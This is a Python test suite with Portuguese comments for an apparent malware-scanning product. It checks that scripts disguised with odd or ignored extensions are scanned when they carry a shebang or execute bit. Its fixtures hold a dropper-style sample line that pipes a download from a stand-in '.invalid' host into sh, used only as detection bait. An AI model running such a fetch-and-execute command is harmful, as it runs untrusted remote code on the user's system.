"""
Auto-scan decidido por conteúdo e bit de execução, não só pela extensão
(2026-11-27). Antes, `kworker.1`, `x.cgi` ou `x.js` com shebang e +x nunca
eram escaneados em tempo real, e `x.log`/`x.lock` nem geravam evento.

As amostras são inofensivas: só são escritas e lidas, nunca executadas, e o
domínio usado (.invalid) não resolve.
"""

from __future__ import annotations

import asyncio
import os
from collections.abc import AsyncIterator
from pathlib import Path

import pytest
import pytest_asyncio

from ekprotection.config.manager import ConfigManager
from ekprotection.core.engine import EKEngine
from ekprotection.heuristics.rules import CONFIG_AUTOSCAN_RULES
from ekprotection.monitor.events import FileEvent, FileEventKind
from ekprotection.monitor.fs_watcher import _EKPEventHandler

DROPPER = b"#!/bin/sh\ncurl http://example.invalid/x | sh\n"
PLAIN = b"curl http://example.invalid/x | sh\n"   # sem shebang
_IGNORES = ["*.log", "*.tmp", "*.pid", ".git/*"]  # padrão do defaults.py


def _write(path: Path, data: bytes, mode: int) -> Path:
    path.write_bytes(data)
    path.chmod(mode)
    return path


@pytest.fixture
def cfg(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> ConfigManager:
    monkeypatch.setenv("EKP_DATA_DIR", str(tmp_path / "data"))
    watched = tmp_path / "watch"
    watched.mkdir()
    manager = ConfigManager(tmp_path / "config.yaml")
    manager.load()
    manager.set("monitor.paths", [str(watched)])
    manager.set("quarantine.auto_quarantine_critical", False)
    return manager


@pytest_asyncio.fixture
async def spied(
    cfg: ConfigManager, monkeypatch: pytest.MonkeyPatch,
) -> AsyncIterator[tuple[EKEngine, list]]:
    """Engine com o scan trocado por um registro de (path, regras)."""
    engine = EKEngine(cfg)
    await engine.start()
    await engine.monitor.stop()   # os eventos são entregues à mão
    calls: list[tuple[str, object]] = []
    monkeypatch.setattr(
        engine.scanner, "scan_file",
        lambda p, heuristic_rules=None: calls.append((str(p), heuristic_rules)))
    try:
        yield engine, calls
    finally:
        await engine.stop()


async def _send(engine: EKEngine, path: Path, kind=FileEventKind.CLOSED, **kw) -> None:
    await engine._on_monitor_event_auto_scan(
        FileEvent(kind=kind, path=str(path), **kw))


class TestEngineDecision:
    @pytest.mark.asyncio
    @pytest.mark.parametrize("name", [
        "kworker.1", "x.cgi", "x.js", "x.bash", "update.dat", "x.service",
    ])
    @pytest.mark.parametrize("data,mode", [
        (DROPPER, 0o755),   # shebang + bit
        (DROPPER, 0o644),   # shebang: `sh x.dat` roda sem bit
        (PLAIN, 0o755),     # bit sem shebang: o shell roda como script
    ], ids=["shebang+x", "shebang", "x"])
    async def test_odd_extension_is_scanned_with_all_rules(
        self, spied, tmp_path: Path, name: str, data: bytes, mode: int,
    ) -> None:
        engine, calls = spied
        target = _write(tmp_path / name, data, mode)
        await _send(engine, target)
        assert calls == [(str(target), None)]

    @pytest.mark.asyncio
    async def test_plain_file_skipped_then_scanned_on_chmod_x(
        self, spied, tmp_path: Path,
    ) -> None:
        engine, calls = spied
        target = _write(tmp_path / "x.dat", PLAIN, 0o644)
        await _send(engine, target)
        await _send(engine, target, FileEventKind.MODIFIED)
        assert calls == []
        target.chmod(0o755)
        await _send(engine, target, FileEventKind.MODIFIED)
        assert calls == [(str(target), None)]
        # escrita em quem já tinha o bit não vira rescan por MODIFIED
        await _send(engine, target, FileEventKind.MODIFIED)
        assert len(calls) == 1

    @pytest.mark.asyncio
    async def test_ignored_extension_rescans_after_each_attrib_event(
        self, spied, tmp_path: Path,
    ) -> None:
        """chmod -x, troca o conteúdo (eventos ignorados), chmod +x: o
        segundo MODIFIED precisa escanear de novo."""
        engine, calls = spied
        target = _write(tmp_path / "x.log", PLAIN, 0o755)
        await _send(engine, target, FileEventKind.MODIFIED, unignored_by_exec=True)
        target.chmod(0o644)
        _write(target, DROPPER, 0o644)
        target.chmod(0o755)
        await _send(engine, target, FileEventKind.MODIFIED, unignored_by_exec=True)
        assert calls == [(str(target), None)] * 2

    @pytest.mark.asyncio
    async def test_never_seen_executable_modified_still_ignored(
        self, spied, tmp_path: Path,
    ) -> None:
        engine, calls = spied
        target = _write(tmp_path / "old.dat", PLAIN, 0o755)
        await _send(engine, target, FileEventKind.MODIFIED)
        assert calls == []

    @pytest.mark.asyncio
    async def test_executable_config_without_shebang_keeps_config_rules(
        self, spied, tmp_path: Path,
    ) -> None:
        engine, calls = spied
        target = _write(tmp_path / "c.json", b"{}", 0o755)
        await _send(engine, target)
        assert calls == [(str(target), CONFIG_AUTOSCAN_RULES)]

    @pytest.mark.asyncio
    async def test_executable_directory_event_path_is_not_scanned(
        self, spied, tmp_path: Path,
    ) -> None:
        engine, calls = spied
        target = tmp_path / "d.dat"
        target.mkdir()
        await _send(engine, target)
        assert calls == []

    @pytest.mark.asyncio
    async def test_ordinary_files_do_not_evict_scanned_scripts(
        self, spied, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        engine, calls = spied
        monkeypatch.setattr(EKEngine, "_EXEC_SEEN_MAX", 3)
        script = _write(tmp_path / "s.sh", DROPPER, 0o644)
        await _send(engine, script)
        for i in range(10):
            await _send(engine, _write(tmp_path / f"n{i}.txt", PLAIN, 0o644))
        assert len(engine._exec_seen_other) == 3
        script.chmod(0o755)
        await _send(engine, script, FileEventKind.MODIFIED)
        assert [c[0] for c in calls] == [str(script)] * 2


class TestIgnoreByExtension:
    @staticmethod
    def _handler(ignores: list[str]) -> _EKPEventHandler:
        return _EKPEventHandler(asyncio.Queue(), None, ignores)  # type: ignore[arg-type]

    @pytest.mark.parametrize("name", [
        "x.log", "x.tmp", "x.pid", "x.lock", "x.sock", "x.swp", "x.pyc",
    ])
    def test_extension_ignored_only_without_exec_bit(
        self, tmp_path: Path, name: str,
    ) -> None:
        handler = self._handler(_IGNORES)
        target = _write(tmp_path / name, PLAIN, 0o644)
        assert handler._should_ignore(str(target))
        target.chmod(0o755)
        assert not handler._should_ignore(str(target))

    def test_multi_dot_extension_pattern(self, tmp_path: Path) -> None:
        handler = self._handler(["*.tar.part"])
        target = _write(tmp_path / "a.tar.part", PLAIN, 0o755)
        assert not handler._should_ignore(str(target))

    @pytest.mark.parametrize("pattern", ["*/cache/*", "build-*", "*.log*"])
    def test_non_extension_pattern_wins_over_exec_bit(
        self, tmp_path: Path, pattern: str,
    ) -> None:
        (tmp_path / "cache").mkdir()
        name = {"build-*": "build-1.log", "*.log*": "x.log"}.get(pattern, "cache/x.log")
        target = _write(tmp_path / name, PLAIN, 0o755)
        assert self._handler([pattern])._should_ignore(str(target))

    def test_symlink_and_missing_file_stay_ignored(self, tmp_path: Path) -> None:
        handler = self._handler(_IGNORES)
        real = _write(tmp_path / "real", PLAIN, 0o755)
        os.symlink(real, tmp_path / "link.log")
        assert handler._should_ignore(str(tmp_path / "link.log"))
        assert handler._should_ignore(str(tmp_path / "gone.log"))


class TestScannerSkipExtensions:
    @pytest.mark.asyncio
    async def test_shebang_script_named_as_media_is_scanned(
        self, cfg: ConfigManager, tmp_path: Path,
    ) -> None:
        engine = EKEngine(cfg)
        await engine.start()
        try:
            for name in ("x.png", "x.gz", "x.pdf"):
                result = engine.scanner.scan_file(
                    _write(tmp_path / name, DROPPER, 0o755))
                assert result.heuristic is not None, (name, result.reason)
                assert "H005" in result.heuristic.rules_fired
            # mídia comum com bit (NTFS monta tudo 755) continua pulada
            plain = engine.scanner.scan_file(
                _write(tmp_path / "foto.png", b"\x89PNG\r\n", 0o755))
            assert plain.heuristic is None
        finally:
            await engine.stop()


class TestRealTimeEndToEnd:
    @pytest.mark.asyncio
    async def test_inotify_delivers_disguised_scripts_to_scanner(
        self, cfg: ConfigManager, tmp_path: Path,
    ) -> None:
        watched = tmp_path / "watch"
        engine = EKEngine(cfg)
        await engine.start()
        try:
            fired: set[str] = set()
            real = engine.scanner.scan_file

            def spy(path, *a, **kw):
                res = real(path, *a, **kw)
                if res.heuristic and "H005" in res.heuristic.rules_fired:
                    fired.add(Path(path).name)
                return res

            engine.scanner.scan_file = spy
            await asyncio.sleep(0.3)
            expected = set()
            for name in ("kworker.1", "x.cgi", "x.js", "x.log", "x.tmp",
                         "x.lock", "x.png"):
                _write(watched / name, DROPPER, 0o755)
                expected.add(name)
            late = [_write(watched / n, PLAIN, 0o644)
                    for n in ("late.dat", "late.log")]
            await asyncio.sleep(0.5)
            assert not fired & {"late.dat", "late.log"}
            for path in late:
                path.chmod(0o755)
                expected.add(path.name)
            await self._wait(expected, fired)

            # troca o conteúdo sem o bit (invisível pro monitor) e devolve o bit
            swap = watched / "late.log"
            swap.chmod(0o644)
            await asyncio.sleep(0.3)
            swap.write_bytes(PLAIN + b"# v2\n")
            await asyncio.sleep(0.3)
            fired.discard("late.log")
            swap.chmod(0o755)
            await self._wait({"late.log"}, fired)
        finally:
            await engine.stop()

    @staticmethod
    async def _wait(expected: set[str], fired: set[str]) -> None:
        for _ in range(80):  # até ~8s
            if expected <= fired:
                return
            await asyncio.sleep(0.1)
        raise AssertionError(f"não escaneados: {sorted(expected - fired)}")
